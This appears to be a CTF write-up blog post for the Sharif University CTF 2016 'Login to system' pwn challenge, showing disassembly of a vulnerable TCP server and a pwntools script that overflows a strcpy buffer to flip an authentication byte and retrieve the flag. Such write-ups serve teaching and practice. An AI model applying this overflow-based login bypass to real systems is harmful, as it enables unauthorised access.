---
layout: post
title:  "Sharif University CTF 2016: Login to system (pwn 100)"
author: f0rki
categories: writeup
---

* **Category:** pwn
* **Points:** 100
* **Description:**

> Can you login to this system without username and password?
>
> telnet ctf.sharif.edu 27515
>
> Download Question.zip


## Write-up

The binary we were given was a threaded TCP server. The connection handling
function is at `0x00400de4`. It asks for username and password. The goal is to
login without username/password. The following piece of code checks whether a
a byte on the stack is `0x01` and then executes code that apparently reads the
flag and sends it to us.

```
│           0x00400f91      488d45e0       lea rax, [rbp-local_4]
│           0x00400f95      0fb600         movzx eax, byte [rax]
│           0x00400f98      3c01           cmp al, 1
```

Fortunately right before this check there is a call to strcpy:

```
│           0x00400f78      488d95d0fbff.  lea rdx, [rbp-local_134]
│           0x00400f7f      488d8520fbff.  lea rax, [rbp-local_156]
│           0x00400f86      4889d6         mov rsi, rdx
│           0x00400f89      4889c7         mov rdi, rax
│           0x00400f8c      e80ffcffff     call sym.imp.strcpy
```

So a stack based buffer overflow and overwriting a local variable. This is
easy. With a quick `pwntools` script we are able to get the flag:


```
from pwn import *  # NOQA

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

vulnbin = "./Question"
velf = ELF(vulnbin)
vp = remote("ctf.sharif.edu", 27515)

username = "yomama"
password = "\x01" * 1050

x = vp.recvuntil("enter:")
assert "username" in x
vp.sendline(username)
x = vp.recvuntil("enter:")
assert "password" in x
vp.sendline(password)

with context.local(log_level='debug'):
    vp.clean_and_log()

vp.interactive()
```
